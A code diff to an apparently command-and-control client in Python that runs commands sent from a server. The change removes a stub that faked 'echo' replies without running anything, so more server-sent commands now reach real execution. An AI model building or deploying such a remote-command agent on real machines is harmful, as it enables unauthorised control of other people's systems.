@@ -18,6 +18,7 @@ from typing import List
 from message import Message
 from models.send_receive_msgs import send_message, receive_message
 from models.message_type import MessageType
+from models.command_type import CommandType
 
 # ==================== CONFIGURATION ====================
 
@@ -206,24 +207,19 @@ class C2Client:
                 cmd_data = await self.command_queue.get()
                 
                 cmd_id = cmd_data.get("cmd_id")
-                command = cmd_data.get("command")
+                command = cmd_data.get("command").lower()
                 
                 logger.info(f"Executing: {command}")
                 
                 start_time = time.time()
                 
-                if command.lower() == "kill":
+                if command == CommandType.KILL.value:
                     logger.info("Kill command received, exiting")
                     result = "Client killed by server"
                     self.running = False
                     # Close reader to stop listener from reading
                     if self.reader:
                         self.reader.feed_eof()
-                
-                elif command.lower().startswith("echo"):
-                    # Extract the echo text
-                    parts = command.split(None, 1)
-                    result = parts[1] if len(parts) > 1 else ""  # fake response. not running the actual command
                 
                 else:
                     # Run command asynchronously in thread pool
